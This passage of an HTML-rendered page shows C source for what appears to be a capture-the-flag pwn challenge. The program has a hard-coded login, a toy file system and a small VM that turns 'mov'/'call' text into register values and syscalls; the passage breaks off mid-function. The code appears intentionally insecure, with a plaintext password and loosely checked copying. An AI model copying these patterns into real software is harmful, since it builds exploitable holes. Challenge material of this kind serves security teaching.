class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  MOV=<span class="number">0</span>,<span class="comment">//0</span></span><br><span class="line">  CALL=<span class="number">1</span>,<span class="comment">//1</span></span><br><span class="line">&#125;IS;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  RDI=<span class="number">0</span>,<span class="comment">//0</span></span><br><span class="line">  RSI=<span class="number">1</span>,<span class="comment">//1</span></span><br><span class="line">  RDX=<span class="number">2</span>,<span class="comment">//2</span></span><br><span class="line">  RAX=<span class="number">3</span>,<span class="comment">//3</span></span><br><span class="line"></span><br><span class="line">&#125;RG;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> REG[<span class="number">4</span>];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user</span>&#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> uid;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> gid;</span><br><span class="line">    <span class="type">char</span> holder[<span class="number">0x40</span>];</span><br><span class="line">&#125;users;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">HRPFILE</span>&#123;</span></span><br><span class="line">  <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> mod;</span><br><span class="line">  <span class="type">char</span> *filename;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">char</span> *file_content;</span><br><span class="line">    </span><br><span class="line">&#125;HF[<span class="number">0x20</span>];</span><br><span class="line"><span class="type">int</span> file_count=<span class="number">0</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> global_fd=<span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> user_count=<span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> user_size=<span class="number">4096</span>;</span><br><span class="line"><span class="type">int</span> login_if=<span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> username[]=<span class="string">&quot;HRPHRP\x00&quot;</span>;</span><br><span class="line"><span class="type">char</span> password[]=<span class="string">&quot;PWNME\x00&quot;</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">write_HRP</span><span class="params">(<span class="type">int</span> fd,<span class="type">char</span> *cont,<span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">  write(fd,cont,len);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">boot_user</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">  FILE *fp=fopen(&quot;./users&quot;,&quot;r+&quot;);</span></span><br><span class="line"><span class="comment">  if (!fp) &#123;</span></span><br><span class="line"><span class="comment">        perror(&quot;fopen&quot;);</span></span><br><span class="line"><span class="comment">        exit(EXIT_FAILURE);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">  username_password = malloc(0x100);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    while (fscanf(fp, &quot;%[^\n ] &quot;, username_password+user_count) != EOF) &#123;</span></span><br><span class="line"><span class="comment">      user_count+=8;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    fclose(fp);*/</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">write_banner</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> banner1[]=<span class="string">&quot; â–ˆâ–ˆ      â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ        â–ˆâ–ˆâ–ˆâ–ˆ     â–ˆâ–ˆâ–ˆâ–ˆ     â–ˆâ–ˆ       â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆ      â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ     â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ\n&quot;</span>;</span><br><span class="line">  <span class="type">char</span> banner2[]=<span class="string">&quot;â–‘â–ˆâ–ˆ     â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆâ–‘â–‘â–‘â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆâ–‘â–‘â–‘â–‘â–ˆâ–ˆ      â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆ   â–ˆâ–ˆâ–‘â–ˆâ–ˆ    â–ˆâ–ˆâ–ˆâ–ˆ     â–ˆâ–ˆâ–‘â–‘â–‘â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆ     â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆ   â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆâ–‘â–‘â–‘â–‘â–‘\n&quot;</span>;</span><br><span class="line">  <span class="type">char</span> banner3[]=<span class="string">&quot;â–‘â–ˆâ–ˆ     â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆ   â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ   â–‘â–ˆâ–ˆ      â–‘â–ˆâ–ˆâ–‘â–‘â–ˆâ–ˆ â–ˆâ–ˆ â–‘â–ˆâ–ˆ   â–ˆâ–ˆâ–‘â–‘â–ˆâ–ˆ   â–ˆâ–ˆ    â–‘â–‘ â–‘â–ˆâ–ˆ     â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆâ–‘â–‘â–ˆâ–ˆ  â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆ     \n&quot;</span>;</span><br><span class="line">  <span class="type">char</span> banner4[]=<span class="string">&quot;â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–ˆâ–ˆ â–‘â–‘â–ˆâ–ˆâ–ˆ  â–‘â–ˆâ–ˆ  â–ˆâ–ˆ  â–‘â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ       â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆ â–‘â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ\n&quot;</span>;</span><br><span class="line">  <span class="type">char</span> banner5[]=<span class="string">&quot;â–‘â–ˆâ–ˆâ–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆâ–‘â–‘â–‘â–ˆâ–ˆ  â–‘â–ˆâ–ˆâ–‘â–‘â–‘â–‘  â–‘â–‘â–‘â–‘â–‘ â–‘â–ˆâ–ˆ  â–‘â–‘â–ˆ   â–‘â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–ˆâ–ˆ       â–‘â–ˆâ–ˆâ–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆ  â–‘â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆâ–‘â–‘â–‘â–‘ \n&quot;</span>;</span><br><span class="line">  <span class="type">char</span> banner6[]=<span class="string">&quot;â–‘â–ˆâ–ˆ     â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆ  â–‘â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ            â–‘â–ˆâ–ˆ   â–‘    â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆâ–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–ˆâ–‘â–‘â–ˆâ–ˆ    â–ˆâ–ˆâ–‘â–ˆâ–ˆ     â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆ   â–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–‘â–ˆâ–ˆ     \n&quot;</span>;</span><br><span class="line">  <span class="type">char</span> banner7[]=<span class="string">&quot;â–‘â–ˆâ–ˆ     â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆ   â–‘â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆ            â–‘â–ˆâ–ˆ        â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆ     â–‘â–ˆâ–ˆ â–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆ     â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆ    â–‘â–‘â–ˆâ–ˆâ–ˆâ–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ\n&quot;</span>;</span><br><span class="line">  <span class="type">char</span> banner8[]=<span class="string">&quot;â–‘â–‘      â–‘â–‘ â–‘â–‘     â–‘â–‘ â–‘â–‘             â–‘â–‘         â–‘â–‘ â–‘â–‘      â–‘â–‘   â–‘â–‘â–‘â–‘â–‘â–‘  â–‘â–‘      â–‘â–‘ â–‘â–‘ â–‘â–‘      â–‘â–‘â–‘ â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘\n&quot;</span>;</span><br><span class="line">  write_HRP(<span class="number">1</span>,banner1,<span class="built_in">strlen</span>(banner1));</span><br><span class="line">  write_HRP(<span class="number">1</span>,banner2,<span class="built_in">strlen</span>(banner2));</span><br><span class="line">  write_HRP(<span class="number">1</span>,banner3,<span class="built_in">strlen</span>(banner3));</span><br><span class="line">  write_HRP(<span class="number">1</span>,banner4,<span class="built_in">strlen</span>(banner4));</span><br><span class="line">  write_HRP(<span class="number">1</span>,banner5,<span class="built_in">strlen</span>(banner5));</span><br><span class="line">  write_HRP(<span class="number">1</span>,banner6,<span class="built_in">strlen</span>(banner6));</span><br><span class="line">  write_HRP(<span class="number">1</span>,banner7,<span class="built_in">strlen</span>(banner7));</span><br><span class="line">  write_HRP(<span class="number">1</span>,banner8,<span class="built_in">strlen</span>(banner8));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">login_system</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  write_HRP(<span class="number">1</span>,<span class="string">&quot;USER NAME:\n&quot;</span>,<span class="built_in">strlen</span>(<span class="string">&quot;USER NAME:\n&quot;</span>));</span><br><span class="line">  <span class="type">char</span> name[<span class="number">0x30</span>];</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%48s[^\n ]&quot;</span>,name);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="type">char</span> pass[<span class="number">0x30</span>];</span><br><span class="line">  write_HRP(<span class="number">1</span>,<span class="string">&quot;PASSWORD:\n&quot;</span>,<span class="built_in">strlen</span>(<span class="string">&quot;PASSWORD:\n&quot;</span>));</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%48s[^\n ]&quot;</span>,pass);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">1</span>;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(name,username))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(pass,password))</span><br><span class="line">      &#123;</span><br><span class="line">        login_if=<span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>&#123;</span><br><span class="line">        write_HRP(<span class="number">1</span>,<span class="string">&quot;password error\n&quot;</span>,<span class="built_in">strlen</span>(<span class="string">&quot;password error\n&quot;</span>));</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      write_HRP(<span class="number">1</span>,<span class="string">&quot;username error\n&quot;</span>,<span class="built_in">strlen</span>(<span class="string">&quot;username error\n&quot;</span>));</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  users.uid=<span class="number">1000</span>;</span><br><span class="line">  users.gid=<span class="number">1000</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,<span class="string">&quot;[+]HOLDER:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>,users.holder,<span class="number">0x10</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">clearScreen</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[1;1H\e[2J&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">check_repeat</span><span class="params">(<span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;file_count;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(name,HF[i].filename))</span><br><span class="line">    &#123;  </span><br><span class="line">      write_HRP(<span class="number">1</span>,<span class="string">&quot;FILE HAD!\n&quot;</span>,<span class="built_in">strlen</span>(<span class="string">&quot;FILE HAD!\n&quot;</span>));</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      ;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">check_repeat_reboot</span><span class="params">(<span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;file_count;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(name,HF[i].filename))</span><br><span class="line">    &#123;  </span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      ;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">create_file</span><span class="params">(<span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="type">int</span> check=check_repeat(name);</span><br><span class="line">  <span class="keyword">if</span>(!check)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  HF[file_count].fd=global_fd;</span><br><span class="line">  HF[file_count].filename=name;</span><br><span class="line">  HF[file_count].mod=<span class="number">1000</span>;</span><br><span class="line">  HF[file_count].file_content=<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;FILE CONTENT: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>,HF[file_count].file_content,<span class="number">0x1000</span>);</span><br><span class="line">  deleEnter(HF[file_count].file_content);</span><br><span class="line">  file_count++;</span><br><span class="line">  global_fd++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ls</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;file_count;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s &quot;</span>,HF[i].filename);</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">deleEnter</span><span class="params">(<span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *tmp = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">if</span> ((tmp = <span class="built_in">strstr</span>(name, <span class="string">&quot;\n&quot;</span>)))</span><br><span class="line">  &#123;</span><br><span class="line">       *tmp = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">cat</span><span class="params">(<span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;file_count;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(name,HF[i].filename))</span><br><span class="line">    &#123;  </span><br><span class="line">      <span class="keyword">if</span>(HF[i].mod==<span class="number">1001</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,HF[i].file_content);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s%s%s\n&quot;</span>,<span class="string">&quot;cat: &quot;</span>,name,<span class="string">&quot;: Permission denied&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> vm_elf(<span class="type">char</span> *name)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> tmp_cmd[<span class="number">0x100</span>][<span class="number">0x10</span>];</span><br><span class="line">  <span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line">  <span class="type">char</span> *exec;</span><br><span class="line">  <span class="type">char</span> tmp_file_content[<span class="number">0x1000</span>];</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;file_count;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(name,HF[i].filename))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strncpy</span>(tmp_file_content,HF[i].file_content,<span class="number">0x1000</span>);</span><br><span class="line">      exec = strtok(tmp_file_content, <span class="string">&quot;;&quot;</span>);</span><br><span class="line">      <span class="keyword">while</span>( exec != <span class="literal">NULL</span> ) </span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">strncpy</span>(tmp_cmd[count],exec,<span class="number">0x10</span>);</span><br><span class="line">        count++;</span><br><span class="line">        exec = strtok(<span class="literal">NULL</span>, <span class="string">&quot;;&quot;</span>);</span><br><span class="line">        </span><br><span class="line">            </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> IS[<span class="number">0x100</span>][<span class="number">0x10</span>];</span><br><span class="line">  <span class="type">char</span> *exec_IS;</span><br><span class="line">  <span class="type">int</span> count_IS=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;count;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strncpy</span>(tmp_file_content,tmp_cmd[i],<span class="number">0x1000</span>);</span><br><span class="line">    exec_IS = strtok(tmp_file_content, <span class="string">&quot; &quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>( exec_IS != <span class="literal">NULL</span> ) </span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">strncpy</span>(IS[count_IS],exec_IS,<span class="number">0x10</span>);</span><br><span class="line">      exec_IS = strtok(<span class="literal">NULL</span>, <span class="string">&quot; &quot;</span>);</span><br><span class="line">      count_IS++;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> obj[<span class="number">0x100</span>][<span class="number">0x10</span>];</span><br><span class="line">  <span class="type">char</span> *exec_obj;</span><br><span class="line">  <span class="type">int</span> count_obj=<span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;count_IS;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(i%<span class="number">2</span>!=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strncpy</span>(tmp_file_content,IS[i],<span class="number">0x1000</span>);</span><br><span class="line">      exec_obj = strtok(tmp_file_content, <span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">while</span>( exec_obj != <span class="literal">NULL</span> ) </span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">strncpy</span>(obj[count_obj],exec_obj,<span class="number">0x10</span>);</span><br><span class="line">        exec_obj = strtok(<span class="literal">NULL</span>, <span class="string">&quot; &quot;</span>);</span><br><span class="line">        count_obj++;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> index=<span class="number">1000</span>;</span><br><span class="line">  <span class="type">int</span> a,b;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;count_obj;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(IS[i],<span class="string">&quot;mov&quot;</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        index=MOV;</span><br><span class="line">        <span class="keyword">goto</span> is;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>&#123;</span><br><span class="line">        index=<span class="number">1000</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(IS[i],<span class="string">&quot;call&quot;</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        index=CALL;</span><br><span class="line">        <span class="keyword">goto</span> is;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>&#123;</span><br><span class="line">        index=<span class="number">1000</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line">is:    <span class="keyword">switch</span>(index)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> MOV:</span><br><span class="line">          a=atoi(obj[i]);</span><br><span class="line">          b=atoi(obj[i+<span class="number">1</span>]);</span><br><span class="line">          <span class="keyword">if</span>((a&amp;&amp;b))</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span>(a)</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(obj[i],<span class="string">&quot;rdi&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">              REG[RDI]=atoi(obj[i+<span class="number">1</span>]);</span><br><span class="line">              </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(obj[i],<span class="string">&quot;rsi&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">              REG[RSI]=atoi(obj[i+<span class="number">1</span>]);</span><br><span class="line">              </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(obj[i],<span class="string">&quot;rdx&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">              REG[RDX]=atoi(obj[i+<span class="number">1</span>]);</span><br><span class="line">              </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(obj[i],<span class="string">&quot;rax&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">              REG[RAX]=atoi(obj[i+<span class="number">1</span>]);</span><br><span class="line">              </span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> CALL:</span><br><span class="line">          a=atoi(obj[i]);</span><br><span class="line">          b=atoi(obj[i+<span class="number">1</span>]);</span><br><span class="line">          <span class="keyword">if</span>((a))</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span>(!b)</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(obj[i],<span class="string">&quot;open&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">              REG[RAX]=b;</span><br><span class="line">              <span class="keyword">if</span>(REG[RAX]==<span class="number">2</span>)</span><br><span class="line">              